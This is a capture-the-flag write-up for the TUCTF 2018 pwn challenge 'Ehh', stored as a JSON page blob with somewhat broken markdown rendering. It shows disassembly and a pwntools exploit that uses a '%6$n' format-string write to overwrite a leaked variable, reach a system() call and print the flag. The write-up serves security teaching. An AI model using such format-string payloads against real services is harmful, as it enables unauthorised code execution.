{"pageContext":{"html":"<p><a href=\"ctf=tu-ctf-2018\"></a>\n<a href=\"type=pwn\"></a>\n<a href=\"tags=stack-canary\"></a>\n<a href=\"tools=radare2,gdb-peda,pwntools,python\"></a></p>\n<h1>Ehh</h1>\n<p>We are given a <a href=\"/ehh-1d45d56e29df4d6731abc0884b2a41df.\">binary</a> which prints out the address of a variable and accepts user input.</p>\n<p><code>bash vagrant@amy:~/share/ehh$ file ehh ehh: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=d50965fb2cafc7eb26ecbce94385e870a05d02eb, not stripped</code></p>\n<p>The binary has a format string vulnerability which can be leveraged to overwrite the variable such that the constaint is satisfied.</p>\n<p>`<code></code>assembly\n...</p>\n<p>│           0x000006f6      8b8328000000   mov eax, dword [ebx + 0x28] ; [0x28:4]=0x200034 ; '('\n│           0x000006fc      83f818         cmp eax, 0x18\n│       ┌─&#x3C; 0x000006ff      7512           jne 0x713\n│       │   0x00000701      83ec0c         sub esp, 0xc\n│       │   0x00000704      8d83d2e7ffff   lea eax, [ebx - 0x182e]\n│       │   0x0000070a      50             push eax                    ; const char *string\n│       │   0x0000070b      e8b0fdffff     call sym.imp.system         ; int system(const char *string)\n│       │   0x00000710      83c410         add esp, 0x10\n│       └─> 0x00000713      b800000000     mov eax, 0</p>\n<p>...\n`<code></code></p>\n<p>Exploit:</p>\n<p>`<code></code>python\nfrom pwn import *</p>\n<p>context(arch='i386', os='linux')</p>\n<h1>p = process('./ehh')</h1>\n<p>p = remote('18.222.213.102', 12345)</p>\n<p>p.recvuntil('here&#x3C; ')\nleak = p.recvuntil('\\n').strip()\nleak = int(leak, 16)</p>\n<p>target<em>len = 0x18\ntarget</em>fmt = '%6$n'\nbuf<em>fmt = '%{}x'\npayload = ''\npayload += p32(leak)\npayload += buf</em>fmt.format(target<em>len - len(payload))\npayload += target</em>fmt</p>\n<p>p.sendline(payload)\np.recvuntil('TUCTF')\nflag =  'TUCTF' + p.recvuntil('\\n')\nlog.success(flag)\n`<code></code></p>\n<p>This gives us the flag</p>\n<blockquote>\n<p>TUCTF{pr1n7f<em>15</em>pr377y<em>c00l</em>huh}</p>\n</blockquote>","relativePath":"writeups/tu-ctf-2018/pwn/ehh/jaiverma"}}